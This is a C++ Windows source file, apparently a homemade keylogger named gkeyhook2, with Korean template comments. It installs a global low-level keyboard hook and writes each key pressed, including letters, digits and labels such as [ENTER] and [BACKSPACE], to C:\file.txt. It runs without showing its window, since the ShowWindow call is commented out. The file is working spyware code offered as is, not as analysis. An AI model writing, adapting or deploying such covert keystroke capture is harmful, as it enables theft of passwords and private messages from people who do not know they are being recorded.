// gkeyhook2.cpp : 응용 프로그램에 대한 진입점을 정의합니다.
//

#include "stdafx.h"
#include "gkeyhook2.h"

#define MAX_LOADSTRING 100



// 전역 변수:
HINSTANCE hInst;								// 현재 인스턴스입니다.
TCHAR szTitle[MAX_LOADSTRING];					// 제목 표시줄 텍스트입니다.
TCHAR szWindowClass[MAX_LOADSTRING];			// 기본 창 클래스 이름입니다.

//파일 처리


DWORD dwWritten; // number of bytes written to file
HANDLE hFile;  


// 이 코드 모듈에 들어 있는 함수의 정방향 선언입니다.
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);


HHOOK hHook;


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
  
	BOOL fEatKeystroke = FALSE;

    if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
        case WM_KEYUP:
           PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
           
		   
		   char szTest[2];
		    char digit[1];
		  
			//char letter;
		   if (p->vkCode)  //redirect a to b
		{     
          

            if ( (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN) ) // Keydown
            {
               
				//sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
				
				if (p->vkCode >= 0x41){
										// MessageBox(NULL, "Hello, World", "TEST", MB_OK);

																	
								sprintf_s(szTest, "%c", tolower(p->vkCode)); // use L"" prefix for wide chars
								//sprintf_s(szTest, "%c", p->vkCode); // use L"" prefix for wide chars
								
								// tolower(p->vkCode);
					WriteFile(hFile, szTest,1,&dwWritten,NULL);     
				 } else if (p->vkCode == 0x20){
					 char str[] = " ";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
						//					sprintf_s(szTest, "%s", ' '); // use L"" prefix for wide chars
				 } else if (p->vkCode == 0x10){
					  char str[] = "[SHIFT]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
						//					sprintf_s(szTest, "%s", '[SHIFT]'); // use L"" prefix for wide chars
				 } else if (p->vkCode == 0x0D){
				    	char str[] = "\r\n[ENTER]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				//							sprintf_s(szTest, "%s", '\n[ENTER]'); // use L"" prefix for wide chars
			     }  else if (p->vkCode == 0x08){
					  char str[] = "[BACKSPACE]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				//							sprintf_s(szTest, "%s", '[BACKSPACE]'); // use L"" prefix for wide chars
			     }  else if (p->vkCode == 0x09){
					  char str[] = "[TAB]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 }  else if (p->vkCode == 0x11){
					  char str[] = "[CTRL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 }  else if (p->vkCode == 0x2E){
					  char str[] = "[DEL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 } else if (p->vkCode == 0x2E){
					  char str[] = "[DEL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 } else if (p->vkCode == 0x14){
					  char str[] = "[CAPITAL]";

					  WriteFile(hFile, str,sizeof(str),&dwWritten,NULL);    
				 
				 } else if (p->vkCode >= 0x30 && p->vkCode <= 0x38){
					 
					 sprintf_s(digit, "%c", p->vkCode); // use L"" prefix for wide chars
											// tolower(p->vkCode);
					WriteFile(hFile, digit,sizeof(digit),&dwWritten,NULL);    
				 }



                           
							
			} 
				

			  
            else if ( (wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP) ) // Keyup
            {
                // keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
            }
         
 
            break;
        }

			
          
        }
    }
    return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}




int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: 여기에 코드를 입력합니다.
	MSG msg;
	HACCEL hAccelTable;

	// 전역 문자열을 초기화합니다.
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_GKEYHOOK2, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// 응용 프로그램 초기화를 수행합니다.
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_GKEYHOOK2));

	// 기본 메시지 루프입니다.
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  함수: MyRegisterClass()
//
//  목적: 창 클래스를 등록합니다.
//
//  설명:
//
//    Windows 95에서 추가된 'RegisterClassEx' 함수보다 먼저
//    해당 코드가 Win32 시스템과 호환되도록
//    하려는 경우에만 이 함수를 사용합니다. 이 함수를 호출해야
//    해당 응용 프로그램에 연결된
//    '올바른 형식의' 작은 아이콘을 가져올 수 있습니다.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_GKEYHOOK2));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_GKEYHOOK2);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   함수: InitInstance(HINSTANCE, int)
//
//   목적: 인스턴스 핸들을 저장하고 주 창을 만듭니다.
//
//   설명:
//
//        이 함수를 통해 인스턴스 핸들을 전역 변수에 저장하고
//        주 프로그램 창을 만든 다음 표시합니다.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // 인스턴스 핸들을 전역 변수에 저장합니다.

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
	
    // Install the low-level keyboard & mouse hooks
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

	hFile=CreateFile("C:\\file.txt",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
if(hFile==INVALID_HANDLE_VALUE)
  {
    MessageBox(0,"Could not create/open a file","Error",16);
    return 0;
  }




  // ShowWindow(hWnd, nCmdShow);
  // UpdateWindow(hWnd);

   return TRUE;
}

//
//  함수: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  목적: 주 창의 메시지를 처리합니다.
//
//  WM_COMMAND	- 응용 프로그램 메뉴를 처리합니다.
//  WM_PAINT	- 주 창을 그립니다.dddsss
//  WM_DESTROY	- 종료 메시지를 게시하고 반환합니다.
//
//
LRESULT CALLBACK WndProc(HWND hWnd,UINT iMessage,WPARAM wParam,LPARAM lParam)
{
	switch(iMessage) {
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return(DefWindowProc(hWnd,iMessage,wParam,lParam));
}
